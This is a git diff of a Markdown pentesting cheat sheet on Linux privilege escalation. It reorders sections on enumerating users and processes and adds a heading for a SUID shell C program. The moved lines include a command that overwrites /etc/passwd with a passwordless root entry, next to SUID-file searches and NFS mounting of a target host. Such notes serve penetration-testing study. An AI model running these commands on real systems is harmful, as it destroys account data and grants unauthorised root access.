@@ -640,6 +640,18 @@ pwd
 sudo -l
 ```
 
+#### What users are on the machine?
+```cat /etc/passwd
+echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd
+grep –vE “nologin|false” /etc/passwd
+```
+
+#### What processes are currently running?
+```
+ps aux | grep root
+netstat –antup
+```
+
 #### Find SUID files that are world-writable (or cronjob)
 ```find / -perm -u=s -type f 2>/dev/null```
 ```find / -perm -g=s -type f 2>/dev/null```
@@ -669,6 +681,7 @@ showmount -e 192.168.1.101
 mount 192.168.1.101:/ /tmp/
 ```
 
+#### SUID.c
 - Often SUID C binary files are required to spawn a shell as a superuser, you can update the UID / GID and shell as required..
 
 ```nano suid.c```:
@@ -681,18 +694,6 @@ system("/bin/bash");
 ```
 
 ```gcc -o suid suid.c```
-
-#### What users are on the machine?
-```cat /etc/passwd
-echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd
-grep –vE “nologin|false” /etc/passwd
-```
-
-#### What processes are currently running?
-```
-ps aux | grep root
-netstat –antup
-```
 
 #### Scripts:-
 - https://github.com/sleventyeleven/linuxprivchecker/
